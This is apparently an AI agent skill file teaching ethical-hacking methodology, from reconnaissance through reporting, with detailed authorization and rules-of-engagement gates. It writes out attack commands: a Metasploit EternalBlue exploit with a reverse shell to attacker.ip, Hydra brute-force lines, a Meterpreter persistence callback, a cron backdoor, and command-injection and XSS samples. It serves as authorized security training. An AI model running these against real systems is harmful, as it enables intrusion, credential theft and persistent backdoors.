# Ethical Hacking Methodology

## Purpose

Master the complete penetration testing lifecycle from reconnaissance through reporting. This skill covers the five stages of ethical hacking methodology, essential tools, attack techniques, and professional reporting for authorized security assessments.

## Prerequisites

### Required Environment
- Kali Linux installed (persistent or live)
- Network access to authorized targets
- Written authorization from system owner

### Mandatory Engagement Controls

Before any active interaction, record the system owner's written authorization and the exact rules of engagement (ROE): in-scope assets and accounts, permitted techniques, excluded data and systems, approved source IPs, test window, maximum request/concurrency rate, monitoring contacts, evidence-handling rules, and emergency stop contact. Prefer an isolated lab, staging environment, or dedicated test account; production testing requires explicit written approval for the specific action.

Treat each active step as a separate gate. Before scanning, exploitation, password testing, privilege escalation, persistence, denial-of-service behavior, or cleanup:

1. Confirm that the target, technique, timing, and expected impact are explicitly allowed by the ROE.
2. State the bounded action, rate/concurrency limit, success condition, rollback or cleanup plan, and stop conditions.
3. Obtain explicit operator approval for that action. Prior approval for reconnaissance or scanning does not authorize exploitation or persistence.
4. Stop immediately on scope uncertainty, unexpected data access, service degradation, account lockout, monitoring alerts, or a request from the system owner. Preserve evidence and notify the named contact.

Never use stealth, source rotation, proxies, VPNs, packet fragmentation, encoding, or other detection-evasion techniques unless that exact technique is explicitly authorized in the ROE. Do not attempt to bypass a defensive control merely because a test is blocked.

### Required Knowledge
- Basic networking concepts
- Linux command-line proficiency
- Understanding of web technologies
- Familiarity with security concepts

## Outputs and Deliverables

1. **Reconnaissance Report** - Target information gathered
2. **Vulnerability Assessment** - Identified weaknesses
3. **Exploitation Evidence** - Proof of concept attacks
4. **Final Report** - Executive and technical findings

## Core Workflow

### Phase 1: Understanding Hacker Types

Classification of security professionals:

**White Hat Hackers (Ethical Hackers)**
- Authorized security professionals
- Conduct penetration testing with permission
- Goal: Identify and fix vulnerabilities
- Also known as: penetration testers, security consultants

**Black Hat Hackers (Malicious)**
- Unauthorized system intrusions
- Motivated by profit, revenge, or notoriety
- Goal: Steal data, cause damage
- Also known as: crackers, criminal hackers

**Grey Hat Hackers (Hybrid)**
- May cross ethical boundaries
- Not malicious but may break rules
- Often disclose vulnerabilities publicly
- Mixed motivations

**Other Classifications**
- **Script Kiddies**: Use pre-made tools without understanding
- **Hacktivists**: Politically or socially motivated
- **Nation State**: Government-sponsored operatives
- **Coders**: Develop tools and exploits

### Phase 2: Reconnaissance

Gather information without direct system interaction:

**Passive Reconnaissance**
```bash
# WHOIS lookup
whois target.com

# DNS enumeration
nslookup target.com
dig target.com ANY
dig target.com MX
dig target.com NS

# Subdomain discovery
dnsrecon -d target.com

# Email harvesting
theHarvester -d target.com -b all
```

**Google Hacking (OSINT)**
```
# Find exposed files
site:target.com filetype:pdf
site:target.com filetype:xls
site:target.com filetype:doc

# Find login pages
site:target.com inurl:login
site:target.com inurl:admin

# Find directory listings
site:target.com intitle:"index of"

# Find configuration files
site:target.com filetype:config
site:target.com filetype:env
```

**Google Hacking Database Categories:**
- Files containing passwords
- Sensitive directories
- Web server detection
- Vulnerable servers
- Error messages
- Login portals

**Social Media Reconnaissance**
- LinkedIn: Organizational charts, technologies used
- Twitter: Company announcements, employee info
- Facebook: Personal information, relationships
- Job postings: Technology stack revelations

### Phase 3: Scanning

Active enumeration of target systems:

Run these examples only after the scanning gate above is approved. Substitute only in-scope targets, begin at the lowest practical rate, honor the ROE request/concurrency ceiling and test window, and stop on degradation, lockouts, or unexpected scope expansion. Aggressive, UDP, all-port, script, and vulnerability scans require separate approval because their impact differs from host discovery.

**Host Discovery**
```bash
# Ping sweep
nmap -sn 192.168.1.0/24

# ARP scan (local network)
arp-scan -l

# Discover live hosts
nmap -sP 192.168.1.0/24
```

**Port Scanning**
```bash
# TCP SYN scan (stealth)
nmap -sS target.com

# Full TCP connect scan
nmap -sT target.com

# UDP scan
nmap -sU target.com

# All ports scan
nmap -p- target.com

# Top 1000 ports with service detection
nmap -sV target.com

# Aggressive scan (OS, version, scripts)
nmap -A target.com
```

**Service Enumeration**
```bash
# Specific service scripts
nmap --script=http-enum target.com
nmap --script=smb-enum-shares target.com
nmap --script=ftp-anon target.com

# Vulnerability scanning
nmap --script=vuln target.com
```

**Common Port Reference**
| Port | Service | Notes |
|------|---------|-------|
| 21 | FTP | File transfer |
| 22 | SSH | Secure shell |
| 23 | Telnet | Unencrypted remote |
| 25 | SMTP | Email |
| 53 | DNS | Name resolution |
| 80 | HTTP | Web |
| 443 | HTTPS | Secure web |
| 445 | SMB | Windows shares |
| 3306 | MySQL | Database |
| 3389 | RDP | Remote desktop |

### Phase 4: Vulnerability Analysis

Identify exploitable weaknesses:

**Automated Scanning**
```bash
# Nikto web scanner
nikto -h http://target.com

# OpenVAS (command line)
omp -u admin -w password --xml="<get_tasks/>"

# Nessus (via API)
nessuscli scan --target target.com
```

**Web Application Testing (OWASP)**
- SQL Injection
- Cross-Site Scripting (XSS)
- Broken Authentication
- Security Misconfiguration
- Sensitive Data Exposure
- XML External Entities (XXE)
- Broken Access Control
- Insecure Deserialization
- Using Components with Known Vulnerabilities
- Insufficient Logging & Monitoring

**Manual Techniques**
```bash
# Directory brute forcing
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt

# Subdomain enumeration
gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt

# Web technology fingerprinting
whatweb target.com
```

### Phase 5: Exploitation

Actively exploit discovered vulnerabilities:

Do not run an exploit from this reference by default. Use a nonproduction replica when possible. For each proof of concept, require explicit approval naming the vulnerability, target, payload, expected data access or system change, time window, rollback, and stop conditions. Use the least-impactful proof that demonstrates the finding; do not retrieve unrelated data, pivot, or establish a shell unless separately authorized.

**Metasploit Framework**
```bash
# Start Metasploit
msfconsole

# Search for exploits
msf> search type:exploit name:smb

# Use specific exploit
msf> use exploit/windows/smb/ms17_010_eternalblue

# Set target
msf> set RHOSTS target.com

# Set payload
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST attacker.ip

# Execute
msf> exploit
```

**Password Attacks**

Password testing requires a separately approved account list, attempt ceiling, request rate, lockout-safe window, and stop condition. Prefer offline testing of authorized test hashes or dedicated test accounts; never use leaked credentials or broad user lists.
```bash
# Hydra brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target.com
hydra -L users.txt -P passwords.txt ftp://target.com

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Web Exploitation**
```bash
# SQLMap for SQL injection
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D database --tables

# XSS testing
# Manual: <script>alert('XSS')</script>

# Command injection testing
# ; ls -la
# | cat /etc/passwd
```

### Phase 6: Maintaining Access

Establish persistent access:

Persistence is not a routine validation step. Use these examples only in a disposable lab or when the ROE explicitly authorizes the exact persistence mechanism, host, duration, callback destination, monitoring coordination, and removal procedure. Obtain fresh operator approval immediately before creation, verify cleanup, and provide the owner with an artifact inventory. Otherwise, document the hypothetical path without deploying it.

**Backdoors**
```bash
# Meterpreter persistence
meterpreter> run persistence -X -i 30 -p 4444 -r attacker.ip

# SSH key persistence
# Add attacker's public key to ~/.ssh/authorized_keys

# Cron job persistence
echo "* * * * * /tmp/backdoor.sh" >> /etc/crontab
```

**Privilege Escalation**

Enumeration may expose sensitive paths and escalation attempts may change system state. Run only the individually approved checks, avoid automated exploit execution, and stop before using elevated access unless that escalation and its impact are explicitly authorized.
```bash
# Linux enumeration
linpeas.sh
linux-exploit-suggester.sh

# Windows enumeration
winpeas.exe
windows-exploit-suggester.py

# Check SUID binaries (Linux)
find / -perm -4000 2>/dev/null

# Check sudo permissions
sudo -l
```

**Covering Tracks (Ethical Context)**
- Document all actions taken
- Maintain logs for reporting
- Avoid unnecessary system changes
- Clean up test files and backdoors

### Phase 7: Reporting

Document findings professionally:

**Report Structure**
1. **Executive Summary**
   - High-level findings
   - Business impact
   - Risk ratings
   - Remediation priorities

2. **Technical Findings**
   - Vulnerability details
   - Proof of concept
   - Screenshots/evidence
   - Affected systems

3. **Risk Ratings**
   - Critical: Immediate action required
   - High: Address within 24-48 hours
   - Medium: Address within 1 week
   - Low: Address within 1 month
   - Informational: Best practice recommendations

4. **Remediation Recommendations**
   - Specific fixes for each finding
   - Short-term mitigations
   - Long-term solutions
   - Resource requirements

5. **Appendices**
   - Detailed scan outputs
   - Tool configurations
   - Testing timeline
   - Scope and methodology

### Phase 8: Common Attack Types

**Phishing**
- Email-based credential theft
- Fake login pages
- Malicious attachments
- Social engineering component

**Malware Types**
- **Virus**: Self-replicating, needs host file
- **Worm**: Self-propagating across networks
- **Trojan**: Disguised as legitimate software
- **Ransomware**: Encrypts files for ransom
- **Rootkit**: Hidden system-level access
- **Spyware**: Monitors user activity

**Network Attacks**
- Man-in-the-Middle (MITM)
- ARP Spoofing
- DNS Poisoning
- DDoS (Distributed Denial of Service)

### Phase 9: Kali Linux Setup

Install penetration testing platform:

**Hard Disk Installation**
1. Download ISO from kali.org
2. Boot from installation media
3. Select "Graphical Install"
4. Configure language, location, keyboard
5. Set hostname and root password
6. Partition disk (Guided - use entire disk)
7. Install GRUB bootloader
8. Reboot and login

**Live USB (Persistent)**
```bash
# First identify the removable device outside this workflow and back up needed data.
# Record its stable device identity and unmount it; never infer a device from /dev/sdX.
lsblk -o NAME,MODEL,SERIAL,SIZE,TYPE,MOUNTPOINTS

# DESTRUCTIVE GATE: require the operator to confirm the exact removable-device
# identity and acknowledge that all data on it will be erased. Prefer the
# platform's verified imaging utility. Do not provide or run a raw dd command
# until that confirmation has been completed outside this skill.

# After the destructive gate, substitute the operator-confirmed stable device
# path; this placeholder is intentionally not directly executable.
gparted <confirmed-removable-device>
# Add ext4 partition labeled "persistence"

# Configure persistence
mkdir /mnt/usb
mount <confirmed-persistence-partition> /mnt/usb
echo "/ union" > /mnt/usb/persistence.conf
umount /mnt/usb
```

### Phase 10: Ethical Guidelines

**Legal Requirements**
- Obtain written authorization
- Define scope clearly
- Document all testing activities
- Report all findings to client
- Maintain confidentiality

**Professional Conduct**
- Work ethically with integrity
- Respect privacy of data accessed
- Avoid unnecessary system damage
- Execute planned tests only
- Never use findings for personal gain

## Constraints and Limitations

### Authorization Required
- Never test without written permission
- Stay within defined scope
- Report unauthorized access attempts
- Reconfirm authorization before every active technique or material increase in impact
- Enforce the approved rate, concurrency, time window, stop conditions, and cleanup plan
- Prefer nonproduction targets and dedicated test accounts

### Professional Standards
- Follow rules of engagement
- Maintain client confidentiality
- Document methodology used
- Provide actionable recommendations

## Troubleshooting

### Scans Blocked

**Solutions:**
1. Stop and determine whether the block or alert is a defined stop condition
2. Notify the monitoring contact and verify that the target, source IP, rate, and window match the ROE
3. Resume only with explicit approval, usually at a lower approved rate or in a nonproduction replica
4. Do not rotate sources, use a proxy or VPN, fragment packets, encode payloads, or otherwise evade the control unless that exact technique is authorized in the ROE

### Exploits Failing

**Solutions:**
1. Verify target vulnerability exists
2. Check payload compatibility
3. Adjust exploit parameters
4. Try alternative exploits
